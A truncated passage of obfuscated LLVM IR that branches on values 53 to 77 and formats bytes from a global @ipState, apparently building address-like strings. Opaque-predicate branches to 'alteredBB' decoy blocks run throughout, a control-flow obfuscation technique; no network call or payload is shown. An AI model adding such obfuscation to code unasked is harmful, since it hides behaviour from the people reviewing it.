  %1026 = icmp eq i32 %1025, 0
  %1027 = icmp slt i32 %1022, 10
  %1028 = or i1 %1026, %1027
  br i1 %1028, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %1020, label %1029, label %1036

; <label>:1029:                                   ; preds = %originalBBpart2116
  %1030 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1031 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1032 = zext i8 %1031 to i32
  %1033 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1034 = zext i8 %1033 to i32
  %1035 = call i32 (i8*, i8*, ...) @szprintf(i8* %1030, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.726, i32 0, i32 0), i32 %1032, i32 %1034)
  br label %1036

; <label>:1036:                                   ; preds = %1029, %originalBBpart2116
  %1037 = load i32, i32* @x.65
  %1038 = load i32, i32* @y.66
  %1039 = sub i32 %1037, 1
  %1040 = mul i32 %1037, %1039
  %1041 = urem i32 %1040, 2
  %1042 = icmp eq i32 %1041, 0
  %1043 = icmp slt i32 %1038, 10
  %1044 = or i1 %1042, %1043
  br i1 %1044, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %1036
  %1045 = load i32, i32* %1, align 4
  %1046 = icmp eq i32 %1045, 53
  %1047 = load i32, i32* @x.65
  %1048 = load i32, i32* @y.66
  %1049 = sub i32 %1047, 1
  %1050 = mul i32 %1047, %1049
  %1051 = urem i32 %1050, 2
  %1052 = icmp eq i32 %1051, 0
  %1053 = icmp slt i32 %1048, 10
  %1054 = or i1 %1052, %1053
  br i1 %1054, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %1046, label %1055, label %1062

; <label>:1055:                                   ; preds = %originalBBpart2120
  %1056 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1057 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1058 = zext i8 %1057 to i32
  %1059 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1060 = zext i8 %1059 to i32
  %1061 = call i32 (i8*, i8*, ...) @szprintf(i8* %1056, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.727, i32 0, i32 0), i32 %1058, i32 %1060)
  br label %1062

; <label>:1062:                                   ; preds = %1055, %originalBBpart2120
  %1063 = load i32, i32* %1, align 4
  %1064 = icmp eq i32 %1063, 54
  br i1 %1064, label %1065, label %1072

; <label>:1065:                                   ; preds = %1062
  %1066 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1067 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1068 = zext i8 %1067 to i32
  %1069 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1070 = zext i8 %1069 to i32
  %1071 = call i32 (i8*, i8*, ...) @szprintf(i8* %1066, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.728, i32 0, i32 0), i32 %1068, i32 %1070)
  br label %1072

; <label>:1072:                                   ; preds = %1065, %1062
  %1073 = load i32, i32* %1, align 4
  %1074 = icmp eq i32 %1073, 55
  br i1 %1074, label %1075, label %1098

; <label>:1075:                                   ; preds = %1072
  %1076 = load i32, i32* @x.65
  %1077 = load i32, i32* @y.66
  %1078 = sub i32 %1076, 1
  %1079 = mul i32 %1076, %1078
  %1080 = urem i32 %1079, 2
  %1081 = icmp eq i32 %1080, 0
  %1082 = icmp slt i32 %1077, 10
  %1083 = or i1 %1081, %1082
  br i1 %1083, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1075
  %1084 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1085 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1086 = zext i8 %1085 to i32
  %1087 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1088 = zext i8 %1087 to i32
  %1089 = call i32 (i8*, i8*, ...) @szprintf(i8* %1084, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.729, i32 0, i32 0), i32 %1086, i32 %1088)
  %1090 = load i32, i32* @x.65
  %1091 = load i32, i32* @y.66
  %1092 = sub i32 %1090, 1
  %1093 = mul i32 %1090, %1092
  %1094 = urem i32 %1093, 2
  %1095 = icmp eq i32 %1094, 0
  %1096 = icmp slt i32 %1091, 10
  %1097 = or i1 %1095, %1096
  br i1 %1097, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %1098

; <label>:1098:                                   ; preds = %originalBBpart2124, %1072
  %1099 = load i32, i32* %1, align 4
  %1100 = icmp eq i32 %1099, 56
  br i1 %1100, label %1101, label %1108

; <label>:1101:                                   ; preds = %1098
  %1102 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1103 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1104 = zext i8 %1103 to i32
  %1105 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1106 = zext i8 %1105 to i32
  %1107 = call i32 (i8*, i8*, ...) @szprintf(i8* %1102, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.730, i32 0, i32 0), i32 %1104, i32 %1106)
  br label %1108

; <label>:1108:                                   ; preds = %1101, %1098
  %1109 = load i32, i32* %1, align 4
  %1110 = icmp eq i32 %1109, 57
  br i1 %1110, label %1111, label %1118

; <label>:1111:                                   ; preds = %1108
  %1112 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1114 = zext i8 %1113 to i32
  %1115 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1116 = zext i8 %1115 to i32
  %1117 = call i32 (i8*, i8*, ...) @szprintf(i8* %1112, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.731, i32 0, i32 0), i32 %1114, i32 %1116)
  br label %1118

; <label>:1118:                                   ; preds = %1111, %1108
  %1119 = load i32, i32* %1, align 4
  %1120 = icmp eq i32 %1119, 58
  br i1 %1120, label %1121, label %1128

; <label>:1121:                                   ; preds = %1118
  %1122 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1123 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1124 = zext i8 %1123 to i32
  %1125 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1126 = zext i8 %1125 to i32
  %1127 = call i32 (i8*, i8*, ...) @szprintf(i8* %1122, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.732, i32 0, i32 0), i32 %1124, i32 %1126)
  br label %1128

; <label>:1128:                                   ; preds = %1121, %1118
  %1129 = load i32, i32* %1, align 4
  %1130 = icmp eq i32 %1129, 59
  br i1 %1130, label %1131, label %1138

; <label>:1131:                                   ; preds = %1128
  %1132 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1134 = zext i8 %1133 to i32
  %1135 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1136 = zext i8 %1135 to i32
  %1137 = call i32 (i8*, i8*, ...) @szprintf(i8* %1132, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.733, i32 0, i32 0), i32 %1134, i32 %1136)
  br label %1138

; <label>:1138:                                   ; preds = %1131, %1128
  %1139 = load i32, i32* @x.65
  %1140 = load i32, i32* @y.66
  %1141 = sub i32 %1139, 1
  %1142 = mul i32 %1139, %1141
  %1143 = urem i32 %1142, 2
  %1144 = icmp eq i32 %1143, 0
  %1145 = icmp slt i32 %1140, 10
  %1146 = or i1 %1144, %1145
  br i1 %1146, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1138
  %1147 = load i32, i32* %1, align 4
  %1148 = icmp eq i32 %1147, 60
  %1149 = load i32, i32* @x.65
  %1150 = load i32, i32* @y.66
  %1151 = sub i32 %1149, 1
  %1152 = mul i32 %1149, %1151
  %1153 = urem i32 %1152, 2
  %1154 = icmp eq i32 %1153, 0
  %1155 = icmp slt i32 %1150, 10
  %1156 = or i1 %1154, %1155
  br i1 %1156, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %1148, label %1157, label %1164

; <label>:1157:                                   ; preds = %originalBBpart2128
  %1158 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1159 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1160 = zext i8 %1159 to i32
  %1161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1162 = zext i8 %1161 to i32
  %1163 = call i32 (i8*, i8*, ...) @szprintf(i8* %1158, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.734, i32 0, i32 0), i32 %1160, i32 %1162)
  br label %1164

; <label>:1164:                                   ; preds = %1157, %originalBBpart2128
  %1165 = load i32, i32* %1, align 4
  %1166 = icmp eq i32 %1165, 61
  br i1 %1166, label %1167, label %1190

; <label>:1167:                                   ; preds = %1164
  %1168 = load i32, i32* @x.65
  %1169 = load i32, i32* @y.66
  %1170 = sub i32 %1168, 1
  %1171 = mul i32 %1168, %1170
  %1172 = urem i32 %1171, 2
  %1173 = icmp eq i32 %1172, 0
  %1174 = icmp slt i32 %1169, 10
  %1175 = or i1 %1173, %1174
  br i1 %1175, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1167
  %1176 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1177 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1178 = zext i8 %1177 to i32
  %1179 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1180 = zext i8 %1179 to i32
  %1181 = call i32 (i8*, i8*, ...) @szprintf(i8* %1176, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.735, i32 0, i32 0), i32 %1178, i32 %1180)
  %1182 = load i32, i32* @x.65
  %1183 = load i32, i32* @y.66
  %1184 = sub i32 %1182, 1
  %1185 = mul i32 %1182, %1184
  %1186 = urem i32 %1185, 2
  %1187 = icmp eq i32 %1186, 0
  %1188 = icmp slt i32 %1183, 10
  %1189 = or i1 %1187, %1188
  br i1 %1189, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1190

; <label>:1190:                                   ; preds = %originalBBpart2132, %1164
  %1191 = load i32, i32* %1, align 4
  %1192 = icmp eq i32 %1191, 62
  br i1 %1192, label %1193, label %1216

; <label>:1193:                                   ; preds = %1190
  %1194 = load i32, i32* @x.65
  %1195 = load i32, i32* @y.66
  %1196 = sub i32 %1194, 1
  %1197 = mul i32 %1194, %1196
  %1198 = urem i32 %1197, 2
  %1199 = icmp eq i32 %1198, 0
  %1200 = icmp slt i32 %1195, 10
  %1201 = or i1 %1199, %1200
  br i1 %1201, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1193
  %1202 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1203 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1204 = zext i8 %1203 to i32
  %1205 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1206 = zext i8 %1205 to i32
  %1207 = call i32 (i8*, i8*, ...) @szprintf(i8* %1202, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.736, i32 0, i32 0), i32 %1204, i32 %1206)
  %1208 = load i32, i32* @x.65
  %1209 = load i32, i32* @y.66
  %1210 = sub i32 %1208, 1
  %1211 = mul i32 %1208, %1210
  %1212 = urem i32 %1211, 2
  %1213 = icmp eq i32 %1212, 0
  %1214 = icmp slt i32 %1209, 10
  %1215 = or i1 %1213, %1214
  br i1 %1215, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %1216

; <label>:1216:                                   ; preds = %originalBBpart2136, %1190
  %1217 = load i32, i32* @x.65
  %1218 = load i32, i32* @y.66
  %1219 = sub i32 %1217, 1
  %1220 = mul i32 %1217, %1219
  %1221 = urem i32 %1220, 2
  %1222 = icmp eq i32 %1221, 0
  %1223 = icmp slt i32 %1218, 10
  %1224 = or i1 %1222, %1223
  br i1 %1224, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1216
  %1225 = load i32, i32* %1, align 4
  %1226 = icmp eq i32 %1225, 63
  %1227 = load i32, i32* @x.65
  %1228 = load i32, i32* @y.66
  %1229 = sub i32 %1227, 1
  %1230 = mul i32 %1227, %1229
  %1231 = urem i32 %1230, 2
  %1232 = icmp eq i32 %1231, 0
  %1233 = icmp slt i32 %1228, 10
  %1234 = or i1 %1232, %1233
  br i1 %1234, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1226, label %1235, label %1242

; <label>:1235:                                   ; preds = %originalBBpart2140
  %1236 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1237 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1238 = zext i8 %1237 to i32
  %1239 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1240 = zext i8 %1239 to i32
  %1241 = call i32 (i8*, i8*, ...) @szprintf(i8* %1236, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.737, i32 0, i32 0), i32 %1238, i32 %1240)
  br label %1242

; <label>:1242:                                   ; preds = %1235, %originalBBpart2140
  %1243 = load i32, i32* %1, align 4
  %1244 = icmp eq i32 %1243, 64
  br i1 %1244, label %1245, label %1252

; <label>:1245:                                   ; preds = %1242
  %1246 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1247 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1248 = zext i8 %1247 to i32
  %1249 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1250 = zext i8 %1249 to i32
  %1251 = call i32 (i8*, i8*, ...) @szprintf(i8* %1246, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.738, i32 0, i32 0), i32 %1248, i32 %1250)
  br label %1252

; <label>:1252:                                   ; preds = %1245, %1242
  %1253 = load i32, i32* %1, align 4
  %1254 = icmp eq i32 %1253, 65
  br i1 %1254, label %1255, label %1262

; <label>:1255:                                   ; preds = %1252
  %1256 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1257 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1258 = zext i8 %1257 to i32
  %1259 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1260 = zext i8 %1259 to i32
  %1261 = call i32 (i8*, i8*, ...) @szprintf(i8* %1256, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.739, i32 0, i32 0), i32 %1258, i32 %1260)
  br label %1262

; <label>:1262:                                   ; preds = %1255, %1252
  %1263 = load i32, i32* @x.65
  %1264 = load i32, i32* @y.66
  %1265 = sub i32 %1263, 1
  %1266 = mul i32 %1263, %1265
  %1267 = urem i32 %1266, 2
  %1268 = icmp eq i32 %1267, 0
  %1269 = icmp slt i32 %1264, 10
  %1270 = or i1 %1268, %1269
  br i1 %1270, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1262
  %1271 = load i32, i32* %1, align 4
  %1272 = icmp eq i32 %1271, 66
  %1273 = load i32, i32* @x.65
  %1274 = load i32, i32* @y.66
  %1275 = sub i32 %1273, 1
  %1276 = mul i32 %1273, %1275
  %1277 = urem i32 %1276, 2
  %1278 = icmp eq i32 %1277, 0
  %1279 = icmp slt i32 %1274, 10
  %1280 = or i1 %1278, %1279
  br i1 %1280, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %1272, label %1281, label %1288

; <label>:1281:                                   ; preds = %originalBBpart2144
  %1282 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1283 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1284 = zext i8 %1283 to i32
  %1285 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1286 = zext i8 %1285 to i32
  %1287 = call i32 (i8*, i8*, ...) @szprintf(i8* %1282, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.740, i32 0, i32 0), i32 %1284, i32 %1286)
  br label %1288

; <label>:1288:                                   ; preds = %1281, %originalBBpart2144
  %1289 = load i32, i32* %1, align 4
  %1290 = icmp eq i32 %1289, 67
  br i1 %1290, label %1291, label %1298

; <label>:1291:                                   ; preds = %1288
  %1292 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1294 = zext i8 %1293 to i32
  %1295 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1296 = zext i8 %1295 to i32
  %1297 = call i32 (i8*, i8*, ...) @szprintf(i8* %1292, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.741, i32 0, i32 0), i32 %1294, i32 %1296)
  br label %1298

; <label>:1298:                                   ; preds = %1291, %1288
  %1299 = load i32, i32* %1, align 4
  %1300 = icmp eq i32 %1299, 68
  br i1 %1300, label %1301, label %1308

; <label>:1301:                                   ; preds = %1298
  %1302 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1303 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1304 = zext i8 %1303 to i32
  %1305 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1306 = zext i8 %1305 to i32
  %1307 = call i32 (i8*, i8*, ...) @szprintf(i8* %1302, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.742, i32 0, i32 0), i32 %1304, i32 %1306)
  br label %1308

; <label>:1308:                                   ; preds = %1301, %1298
  %1309 = load i32, i32* @x.65
  %1310 = load i32, i32* @y.66
  %1311 = sub i32 %1309, 1
  %1312 = mul i32 %1309, %1311
  %1313 = urem i32 %1312, 2
  %1314 = icmp eq i32 %1313, 0
  %1315 = icmp slt i32 %1310, 10
  %1316 = or i1 %1314, %1315
  br i1 %1316, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1308
  %1317 = load i32, i32* %1, align 4
  %1318 = icmp eq i32 %1317, 69
  %1319 = load i32, i32* @x.65
  %1320 = load i32, i32* @y.66
  %1321 = sub i32 %1319, 1
  %1322 = mul i32 %1319, %1321
  %1323 = urem i32 %1322, 2
  %1324 = icmp eq i32 %1323, 0
  %1325 = icmp slt i32 %1320, 10
  %1326 = or i1 %1324, %1325
  br i1 %1326, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1318, label %1327, label %1334

; <label>:1327:                                   ; preds = %originalBBpart2148
  %1328 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1329 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1330 = zext i8 %1329 to i32
  %1331 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1332 = zext i8 %1331 to i32
  %1333 = call i32 (i8*, i8*, ...) @szprintf(i8* %1328, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.743, i32 0, i32 0), i32 %1330, i32 %1332)
  br label %1334

; <label>:1334:                                   ; preds = %1327, %originalBBpart2148
  %1335 = load i32, i32* %1, align 4
  %1336 = icmp eq i32 %1335, 70
  br i1 %1336, label %1337, label %1344

; <label>:1337:                                   ; preds = %1334
  %1338 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1339 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1340 = zext i8 %1339 to i32
  %1341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1342 = zext i8 %1341 to i32
  %1343 = call i32 (i8*, i8*, ...) @szprintf(i8* %1338, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.744, i32 0, i32 0), i32 %1340, i32 %1342)
  br label %1344

; <label>:1344:                                   ; preds = %1337, %1334
  %1345 = load i32, i32* %1, align 4
  %1346 = icmp eq i32 %1345, 71
  br i1 %1346, label %1347, label %1354

; <label>:1347:                                   ; preds = %1344
  %1348 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1349 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1350 = zext i8 %1349 to i32
  %1351 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1352 = zext i8 %1351 to i32
  %1353 = call i32 (i8*, i8*, ...) @szprintf(i8* %1348, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.698, i32 0, i32 0), i32 %1350, i32 %1352)
  br label %1354

; <label>:1354:                                   ; preds = %1347, %1344
  %1355 = load i32, i32* %1, align 4
  %1356 = icmp eq i32 %1355, 72
  br i1 %1356, label %1357, label %1380

; <label>:1357:                                   ; preds = %1354
  %1358 = load i32, i32* @x.65
  %1359 = load i32, i32* @y.66
  %1360 = sub i32 %1358, 1
  %1361 = mul i32 %1358, %1360
  %1362 = urem i32 %1361, 2
  %1363 = icmp eq i32 %1362, 0
  %1364 = icmp slt i32 %1359, 10
  %1365 = or i1 %1363, %1364
  br i1 %1365, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1357
  %1366 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1367 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1368 = zext i8 %1367 to i32
  %1369 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1370 = zext i8 %1369 to i32
  %1371 = call i32 (i8*, i8*, ...) @szprintf(i8* %1366, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.745, i32 0, i32 0), i32 %1368, i32 %1370)
  %1372 = load i32, i32* @x.65
  %1373 = load i32, i32* @y.66
  %1374 = sub i32 %1372, 1
  %1375 = mul i32 %1372, %1374
  %1376 = urem i32 %1375, 2
  %1377 = icmp eq i32 %1376, 0
  %1378 = icmp slt i32 %1373, 10
  %1379 = or i1 %1377, %1378
  br i1 %1379, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1380

; <label>:1380:                                   ; preds = %originalBBpart2152, %1354
  %1381 = load i32, i32* %1, align 4
  %1382 = icmp eq i32 %1381, 73
  br i1 %1382, label %1383, label %1406

; <label>:1383:                                   ; preds = %1380
  %1384 = load i32, i32* @x.65
  %1385 = load i32, i32* @y.66
  %1386 = sub i32 %1384, 1
  %1387 = mul i32 %1384, %1386
  %1388 = urem i32 %1387, 2
  %1389 = icmp eq i32 %1388, 0
  %1390 = icmp slt i32 %1385, 10
  %1391 = or i1 %1389, %1390
  br i1 %1391, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1383
  %1392 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1393 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1394 = zext i8 %1393 to i32
  %1395 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1396 = zext i8 %1395 to i32
  %1397 = call i32 (i8*, i8*, ...) @szprintf(i8* %1392, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.700, i32 0, i32 0), i32 %1394, i32 %1396)
  %1398 = load i32, i32* @x.65
  %1399 = load i32, i32* @y.66
  %1400 = sub i32 %1398, 1
  %1401 = mul i32 %1398, %1400
  %1402 = urem i32 %1401, 2
  %1403 = icmp eq i32 %1402, 0
  %1404 = icmp slt i32 %1399, 10
  %1405 = or i1 %1403, %1404
  br i1 %1405, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %1406

; <label>:1406:                                   ; preds = %originalBBpart2156, %1380
  %1407 = load i32, i32* %1, align 4
  %1408 = icmp eq i32 %1407, 74
  br i1 %1408, label %1409, label %1416

; <label>:1409:                                   ; preds = %1406
  %1410 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1411 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1412 = zext i8 %1411 to i32
  %1413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1414 = zext i8 %1413 to i32
  %1415 = call i32 (i8*, i8*, ...) @szprintf(i8* %1410, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.746, i32 0, i32 0), i32 %1412, i32 %1414)
  br label %1416

; <label>:1416:                                   ; preds = %1409, %1406
  %1417 = load i32, i32* @x.65
  %1418 = load i32, i32* @y.66
  %1419 = sub i32 %1417, 1
  %1420 = mul i32 %1417, %1419
  %1421 = urem i32 %1420, 2
  %1422 = icmp eq i32 %1421, 0
  %1423 = icmp slt i32 %1418, 10
  %1424 = or i1 %1422, %1423
  br i1 %1424, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1416
  %1425 = load i32, i32* %1, align 4
  %1426 = icmp eq i32 %1425, 75
  %1427 = load i32, i32* @x.65
  %1428 = load i32, i32* @y.66
  %1429 = sub i32 %1427, 1
  %1430 = mul i32 %1427, %1429
  %1431 = urem i32 %1430, 2
  %1432 = icmp eq i32 %1431, 0
  %1433 = icmp slt i32 %1428, 10
  %1434 = or i1 %1432, %1433
  br i1 %1434, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br i1 %1426, label %1435, label %1442

; <label>:1435:                                   ; preds = %originalBBpart2160
  %1436 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1437 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1438 = zext i8 %1437 to i32
  %1439 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1440 = zext i8 %1439 to i32
  %1441 = call i32 (i8*, i8*, ...) @szprintf(i8* %1436, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.747, i32 0, i32 0), i32 %1438, i32 %1440)
  br label %1442

; <label>:1442:                                   ; preds = %1435, %originalBBpart2160
  %1443 = load i32, i32* %1, align 4
  %1444 = icmp eq i32 %1443, 76
  br i1 %1444, label %1445, label %1452

; <label>:1445:                                   ; preds = %1442
  %1446 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1447 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1448 = zext i8 %1447 to i32
  %1449 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1450 = zext i8 %1449 to i32
  %1451 = call i32 (i8*, i8*, ...) @szprintf(i8* %1446, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.662, i32 0, i32 0), i32 %1448, i32 %1450)
  br label %1452

; <label>:1452:                                   ; preds = %1445, %1442
  %1453 = load i32, i32* %1, align 4
  %1454 = icmp eq i32 %1453, 77
  br i1 %1454, label %1455, label %1462

; <label>:1455:                                   ; preds = %1452
  %1456 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1457 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1458 = zext i8 %1457 to i32
